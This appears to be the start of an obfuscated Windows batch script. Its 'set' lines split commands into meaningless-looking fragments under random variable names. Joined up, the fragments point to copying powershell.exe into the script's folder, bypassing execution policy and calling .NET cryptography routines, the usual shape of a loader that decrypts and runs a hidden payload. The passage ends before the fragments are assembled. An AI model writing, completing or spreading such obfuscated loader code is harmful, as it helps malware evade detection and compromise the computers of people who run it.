@echo off
set "AEnIQFjZUa=co"
set "SdoCYUZFqM=ll"
set "KwTzcPJPVs=st"
set "ETmJDwWBWO=po"
set "mGcREASWMk=:\"
set "VyTOfnWoCJ=we"
set "jIHcDdferH=s\"
set "EneZJYrxdz=do"
set "idofNhTNPd=ow"
set "hmBhMMhMKC=y "
set "eacItdaIKU=em"
set "kkeLfGVENz=he"
set "vrdBIQDvSC=rS"
set "BbupPgSSTa=rs"
set "JlvhLKFhzF=he"
set "EeHVDKuhIz=xe"
set "zhoqVOEkqT=1."
set "ZnoUlXPgoK=\v"
set "ssAcRyNRqV= /"
set "baNREDxfLP= C"
set "LHLnXAQwdm=nd"
set "vlEyyflKii=ll"
set "nycsbCyXTw=.e"
set "tqiYCQCKOZ=in"
set "uLfvvDKgci=32"
set "SYUJzXNRMC=Wi"
set "fDMNgZgrpG=ws"
set "leTLtMOhaN=\W"
set "oTHWAdDgTF=Po"
set "OVEtEbFtnw=py"
set "sSuwakMFcC=0\"
set "QFtidFVOTd=Sy"
set "aZrcEYaTcv=we"
set "ODBYbRNraw= %~dp0"
set "tQzaoNSxAu=cd"
set "qNDDeLfstr=.Dis"
set "kAjobWkrGx=tem."
set "sBWNQmRNYD=cy ="
set "EkfrGbgigM='txe"
set "cQinNHrJWk=$VIw"
set "OJyAcVMdex=;$nF"
set "miTUxBaiGR=.Cry"
set "cFhIGrqDsU=.Sec"
set "qyKLknRkLV=fy.I"
set "cAZEFiaWUo=pg.T"
set "xKnMyFtMSg=I.Su"
set "XomrEVzIIv=$efF"
set "KPCpLLTVCg=Syst"
set "vcyIXtGoGu=-ep "
set "hAnOEqueVr=] -j"
set "nLmzirhUXH=Trlq"
set "XORcxZIDAd=ct S"
set "vZpvuXFoaj=S46e"
